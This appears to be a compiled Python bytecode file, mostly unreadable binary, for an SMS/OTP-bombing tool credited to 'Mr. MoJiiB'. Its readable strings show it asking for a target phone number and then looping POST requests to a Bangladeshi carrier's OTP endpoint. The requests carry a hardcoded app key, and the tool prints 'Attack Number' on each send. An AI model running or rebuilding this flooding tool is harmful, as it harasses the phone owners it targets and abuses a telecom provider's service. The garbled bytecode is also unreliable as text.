o
    ���b�  �                   @   s�  d dl Z e �d� d dl Z e �d� ed� d dlZd dl Z d dlZd dlZd dlZdZdZdZ	dZ
d	Zd
ZdZdZdd� Zeee	d e
 ��Ze �d� eed � e�d�Zee	d � ee	d � eed e	 d e d � e�d� ee
de�� d � eed � ee
d � d dlZd dlZd dlmZ dZe� Zded< ded < d!ed"< d#e Zed$�D ]6Zz)ejeeed%�Ze�d&� eeed' g�e ej  e d( e	 e e
 d) � W q�   eed* � Y q�e �d� dS )+�    N�clearzlolcat banner.py�
z[1;90mz[1;91mz[1;92mz[1;93mz[1;94mz[1;95mz[1;96mz[1;97mc                 C   s2   | d D ]}t j�|� t j��  t�d� qd S )Nr   �{�G�z�?)�sys�stdout�write�flush�time�sleep)ZPuDiNaZword� r   �cpin.py�	logoprint   s
   
�r   z    Enter Target Number: z4
==================================================
zhttps://ipinfo.io/jsonz	 DEVELOPED BY : Mr. MoJiiBz	 VERSION 	  : 3.0u   	 ♥♥z	 Mr. MoJiiBr   z	 Your IP Addreds:- Zipz3
==================================================z$  To Stop Attack press CTRL + Z....
)�CaseInsensitiveDictz4https://circle.robi.com.bd/mylife/appapi/appcall.phpZ(000oc0so48owkw4s0wwo4c00g00804w80gwkw8kgz	x-app-key�gzipz
User-Agentz!application/x-www-form-urlencodedzContent-Typez,op=getOTC&pin=21799&app_version=78&msisdn=88l   �����gBz�b�0k�60"]HSI1M>)�headers�data�   �   z 
tAttack Number z Stay With Mr. MoJiiB
z'
[~] Make Sure Your Internet Connection)!�os�system�printZasyncior   Zrequestsr	   ZbiblackZbiredZbigreenZbiyellowZbiblueZbipurpleZbicyanZbiehiter   �str�inputZnumber�getZresponser
   ZjsonZrequests.structuresr   Zurlr   r   �range�iZpost�x�textr   r   r   r   �<module>   sZ    




	
8